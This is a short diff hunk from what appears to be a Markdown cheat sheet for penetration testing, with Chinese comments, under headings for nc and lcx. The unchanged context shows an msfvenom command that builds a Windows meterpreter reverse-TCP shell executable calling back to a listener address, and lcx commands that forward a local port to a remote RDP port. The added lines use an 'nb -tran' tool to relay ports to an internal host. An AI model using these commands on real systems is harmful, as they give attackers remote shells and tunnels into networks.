@@ -69,6 +69,9 @@ nc
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.142.110 lport=1080 -f exe -o shell.exe
 ```
 ### lcx
+nb -tran 8000 192.168.127.134:8000
+nb -tran 1235 192.168.127.134:1235
+
 ```bash
 # 正向转发 lcx.exe -tran LocalPort RemoteHost RemotePOrt 
 lcx.exe -tran 1234 192.168.10.10 3389
